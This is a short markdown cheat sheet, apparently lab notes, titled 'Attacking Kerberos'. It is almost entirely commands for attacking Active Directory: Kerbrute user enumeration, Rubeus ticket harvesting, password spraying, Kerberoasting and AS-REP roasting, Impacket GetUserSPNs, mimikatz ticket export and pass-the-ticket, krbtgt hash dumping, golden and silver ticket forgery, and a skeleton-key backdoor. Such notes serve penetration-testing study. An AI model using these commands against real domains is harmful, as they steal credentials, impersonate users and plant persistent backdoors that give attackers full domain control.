# Attacking Kerberos 

## Enumeration w/ Kerbrute
```
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

## Harvesting Tickets w/ Rubeus
This command tells Rubeus to harvest for TGTs every 30 seconds
```
Rubeus.exe harvest /interval:30
```
## Password-Spraying w/ Rubeus
```
Rubeus.exe brute /password:Password1 /noticket
```
## Kerberoasting w/ Rubeus & Impacket
```
Rubeus.exe kerberoast
```
```
cd /usr/share/doc/python3-impacket/examples/
sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip MACHINE_IP -request
```
## AS-REP Roasting w/ Rubeus
```
Rubeus.exe asreproast
```
## Pass the Ticket w/ mimikatz
```
mimikatz.exe
privilege::debug           #Ensure this outputs [output '20' OK] (You need admin privileges)
sekurlsa::tickets /export  #This will export all of the .kirbi tickets into the directory that you are currently in.
kerberos::ptt <ticket>     #This will cache and impersonate the given ticket.
klist                      #Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.
```
## Golden/Silver Ticket Attacks w/ mimikatz
Dump the krbtgt hash
```
mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
```

Create a Silver Ticket
```
Kerberos::golden /user:Administrator /domain:controller.local /sid:<SID> /krbtgt:<NTLM hash> /id:1103
```
Create a Golden Ticket
```
Kerberos::golden /user:Administrator /domain:controller.local /sid:<SID> /krbtgt:<NTLM hash> /id:500
```
`misc::cmd` - this will open a new elevated command prompt with the given ticket in mimikatz.

`sid:` -> The sid of the service account.

`krbtgt` -> Put a service NTLM hash here.

`id` -> Put 500 to create golden tickets, change it to 1103 for silver tickets.

## Kerberos Backdoors w/ mimikatz (Skeleton Key)
```
mimikatz.exe
privilege::debug
misc::skeleton
```
